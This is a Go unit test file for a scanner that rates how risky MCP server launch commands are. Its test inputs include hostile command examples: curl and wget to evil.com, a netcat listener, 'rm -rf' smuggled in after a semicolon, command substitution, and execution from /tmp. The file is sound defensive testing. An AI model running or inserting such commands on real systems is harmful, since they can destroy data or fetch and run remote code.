// Copyright 2026 Golf
// SPDX-License-Identifier: Apache-2.0

package checks

import (
	"strings"
	"testing"

	"github.com/golf-mcp/golf-scanner/auditor"
)

// Helper to run command check and get worst severity.
func runCommandCheck(inv auditor.ServerInventory) ([]auditor.Finding, auditor.Severity) {
	check := &CommandSanitizationCheck{}
	ctx := makeCtx(inv)
	findings := check.Run(ctx)
	worst := auditor.SeveritySkip
	for _, f := range findings {
		if auditor.SeverityRank(f.Severity) > auditor.SeverityRank(worst) {
			worst = f.Severity
		}
	}
	return findings, worst
}

// --- UC-1.1: Sudo ---

func TestCommand_SudoInCommand(t *testing.T) {
	_, sev := runCommandCheck(auditor.ServerInventory{Cmd: "sudo", Args: []string{"npx", "pkg"}})
	if sev != auditor.SeverityCritical {
		t.Errorf("expected CRITICAL for sudo in cmd, got %s", sev)
	}
}

func TestCommand_SudoInArgs(t *testing.T) {
	_, sev := runCommandCheck(auditor.ServerInventory{Cmd: "npx", Args: []string{"sudo", "pkg"}})
	if sev != auditor.SeverityCritical {
		t.Errorf("expected CRITICAL for sudo in args, got %s", sev)
	}
}

// --- UC-1.2: Shell metacharacters ---

func TestCommand_SemicolonInArgs(t *testing.T) {
	_, sev := runCommandCheck(auditor.ServerInventory{Cmd: "npx", Args: []string{"pkg;", "rm", "-rf"}})
	if sev != auditor.SeverityCritical {
		t.Errorf("expected CRITICAL for semicolon, got %s", sev)
	}
}

func TestCommand_PipeInArgs(t *testing.T) {
	_, sev := runCommandCheck(auditor.ServerInventory{Cmd: "npx", Args: []string{"pkg", "|", "grep"}})
	if sev != auditor.SeverityCritical {
		t.Errorf("expected CRITICAL for pipe, got %s", sev)
	}
}

func TestCommand_DoublePipeInArgs(t *testing.T) {
	_, sev := runCommandCheck(auditor.ServerInventory{Cmd: "npx", Args: []string{"pkg", "||", "fallback"}})
	if sev != auditor.SeverityCritical {
		t.Errorf("expected CRITICAL for ||, got %s", sev)
	}
}

func TestCommand_AndChainInArgs(t *testing.T) {
	_, sev := runCommandCheck(auditor.ServerInventory{Cmd: "npx", Args: []string{"pkg", "&&", "rm"}})
	if sev != auditor.SeverityCritical {
		t.Errorf("expected CRITICAL for &&, got %s", sev)
	}
}

func TestCommand_CommandSubstitution(t *testing.T) {
	_, sev := runCommandCheck(auditor.ServerInventory{Cmd: "npx", Args: []string{"$(whoami)"}})
	if sev != auditor.SeverityCritical {
		t.Errorf("expected CRITICAL for $(), got %s", sev)
	}
}

func TestCommand_BacktickSubstitution(t *testing.T) {
	_, sev := runCommandCheck(auditor.ServerInventory{Cmd: "npx", Args: []string{"`whoami`"}})
	if sev != auditor.SeverityCritical {
		t.Errorf("expected CRITICAL for backtick, got %s", sev)
	}
}

func TestCommand_VariableExpansion(t *testing.T) {
	_, sev := runCommandCheck(auditor.ServerInventory{Cmd: "npx", Args: []string{"${PATH}"}})
	if sev != auditor.SeverityCritical {
		t.Errorf("expected CRITICAL for ${}, got %s", sev)
	}
}

// --- UC-1.3: Network download ---

func TestCommand_CurlInCommand(t *testing.T) {
	_, sev := runCommandCheck(auditor.ServerInventory{Cmd: "curl", Args: []string{"https://evil.com"}})
	if sev != auditor.SeverityHigh {
		t.Errorf("expected HIGH for curl, got %s", sev)
	}
}

func TestCommand_WgetInCommand(t *testing.T) {
	_, sev := runCommandCheck(auditor.ServerInventory{Cmd: "wget", Args: []string{"https://evil.com"}})
	if sev != auditor.SeverityHigh {
		t.Errorf("expected HIGH for wget, got %s", sev)
	}
}

func TestCommand_NetcatVariants(t *testing.T) {
	for _, cmd := range []string{"nc", "netcat", "ncat"} {
		t.Run(cmd, func(t *testing.T) {
			_, sev := runCommandCheck(auditor.ServerInventory{Cmd: cmd, Args: []string{"-l", "4444"}})
			if sev != auditor.SeverityHigh {
				t.Errorf("expected HIGH for %s, got %s", cmd, sev)
			}
		})
	}
}

func TestCommand_DownloaderVariants(t *testing.T) {
	for _, cmd := range []string{"fetch", "aria2c", "axel"} {
		t.Run(cmd, func(t *testing.T) {
			_, sev := runCommandCheck(auditor.ServerInventory{Cmd: cmd, Args: []string{"https://example.com"}})
			if sev != auditor.SeverityHigh {
				t.Errorf("expected HIGH for %s, got %s", cmd, sev)
			}
		})
	}
}

// --- UC-1.4: Shell execution ---

func TestCommand_ShellDashC(t *testing.T) {
	shells := []string{"bash", "sh", "zsh", "ksh", "csh", "tcsh", "fish", "dash"}
	for _, shell := range shells {
		t.Run(shell, func(t *testing.T) {
			_, sev := runCommandCheck(auditor.ServerInventory{Cmd: shell, Args: []string{"-c", "echo hello"}})
			if sev != auditor.SeverityHigh {
				t.Errorf("expected HIGH for %s -c, got %s", shell, sev)
			}
		})
	}
}

// --- UC-1.5: Dynamic execution ---

func TestCommand_ExecFlag(t *testing.T) {
	_, sev := runCommandCheck(auditor.ServerInventory{Cmd: "find", Args: []string{".", "--exec", "rm", "{}"}})
	if sev != auditor.SeverityHigh {
		t.Errorf("expected HIGH for --exec, got %s", sev)
	}
}

func TestCommand_EvalFlag(t *testing.T) {
	_, sev := runCommandCheck(auditor.ServerInventory{Cmd: "perl", Args: []string{"-e", "'print hello'"}})
	if sev != auditor.SeverityHigh {
		t.Errorf("expected HIGH for -e flag, got %s", sev)
	}
}

func TestCommand_EvalCall(t *testing.T) {
	_, sev := runCommandCheck(auditor.ServerInventory{Cmd: "python", Args: []string{"-c", "eval('import os')"}})
	if sev != auditor.SeverityHigh {
		t.Errorf("expected HIGH for eval(), got %s", sev)
	}
}

func TestCommand_ExecCall(t *testing.T) {
	_, sev := runCommandCheck(auditor.ServerInventory{Cmd: "python", Args: []string{"-c", "exec('import os')"}})
	if sev != auditor.SeverityHigh {
		t.Errorf("expected HIGH for exec(), got %s", sev)
	}
}

// --- UC-1.6: Temporary paths ---

func TestCommand_TmpPaths(t *testing.T) {
	paths := []struct {
		cmd  string
		name string
	}{
		{"/tmp/evil", "tmp"},
		{"/var/tmp/evil", "var-tmp"},
		{"/dev/shm/evil", "dev-shm"},
		{"/run/user/evil", "run-user"},
	}
	for _, p := range paths {
		t.Run(p.name, func(t *testing.T) {
			_, sev := runCommandCheck(auditor.ServerInventory{Cmd: p.cmd})
			if sev != auditor.SeverityHigh {
				t.Errorf("expected HIGH for %s, got %s", p.cmd, sev)
			}
		})
	}
}

func TestCommand_WindowsTempPath(t *testing.T) {
	_, sev := runCommandCheck(auditor.ServerInventory{Cmd: "cmd", Args: []string{"%TEMP%\\evil.exe"}})
	if sev != auditor.SeverityHigh {
		t.Errorf("expected HIGH for %%TEMP%%, got %s", sev)
	}
}

func TestCommand_TmpdirVar(t *testing.T) {
	_, sev := runCommandCheck(auditor.ServerInventory{Cmd: "bash", Args: []string{"$TMPDIR/script.sh"}})
	if sev != auditor.SeverityHigh {
		t.Errorf("expected HIGH for $TMPDIR, got %s", sev)
	}
}

func TestCommand_TmpdirVarBraces(t *testing.T) {
	_, sev := runCommandCheck(auditor.ServerInventory{Cmd: "bash", Args: []string{"${TMPDIR}/script.sh"}})
	if sev != auditor.SeverityCritical { // ${} also matches variable expansion (UC-1.2)
		t.Errorf("expected CRITICAL for ${TMPDIR} (variable expansion + tmpdir), got %s", sev)
	}
}

// --- Clean cases ---

func TestCommand_CleanPackageManager(t *testing.T) {
	_, sev := runCommandCheck(auditor.ServerInventory{Cmd: "npx", Args: []string{"@modelcontextprotocol/server-github"}})
	if sev != auditor.SeverityNote {
		t.Errorf("expected NOTE for clean package command, got %s", sev)
	}
}

func TestCommand_CleanBinary(t *testing.T) {
	_, sev := runCommandCheck(auditor.ServerInventory{Cmd: "/usr/local/bin/mcp-server", Args: []string{"--port", "3001"}})
	if sev != auditor.SeverityNote {
		t.Errorf("expected NOTE for clean binary, got %s", sev)
	}
}

func TestCommand_EmptyCommand(t *testing.T) {
	_, sev := runCommandCheck(auditor.ServerInventory{})
	if sev != auditor.SeveritySkip {
		t.Errorf("expected SKIP for empty command, got %s", sev)
	}
}

// --- Verify patterns only check args for args-only flags ---

func TestCommand_SemicolonNotInCmd(t *testing.T) {
	// Semicolon is args-only, should not flag in cmd alone
	findings, _ := runCommandCheck(auditor.ServerInventory{Cmd: "npx", Args: []string{"clean-package"}})
	for _, f := range findings {
		if strings.Contains(f.Message, "semicolon") {
			t.Error("semicolon should not be flagged in clean args")
		}
	}
}

func TestCommand_MultiplePatterns(t *testing.T) {
	// Multiple patterns should all be detected
	findings, sev := runCommandCheck(auditor.ServerInventory{Cmd: "sudo", Args: []string{"curl", "http://evil.com", ";", "rm", "-rf"}})
	if sev != auditor.SeverityCritical {
		t.Errorf("expected CRITICAL for multiple patterns, got %s", sev)
	}
	// Should contain both sudo and semicolon in the message
	msg := findings[0].Message
	if !strings.Contains(msg, "sudo") {
		t.Error("expected sudo in message")
	}
	if !strings.Contains(msg, "semicolon") {
		t.Error("expected semicolon in message")
	}
}

// --- Pipe edge cases ---

func TestCommand_PipeVsDoublePipe(t *testing.T) {
	// Double pipe should be detected as || (OR), not as single pipe
	check := &CommandSanitizationCheck{}
	ctx := makeCtx(auditor.ServerInventory{Cmd: "npx", Args: []string{"a", "||", "b"}})
	findings := check.Run(ctx)
	msg := findings[0].Message
	if strings.Contains(msg, "pipe") && !strings.Contains(msg, "double-pipe") {
		// "pipe" should not appear without "double-pipe"
		t.Errorf("message contains 'pipe' without 'double-pipe': %s", msg)
	}
}
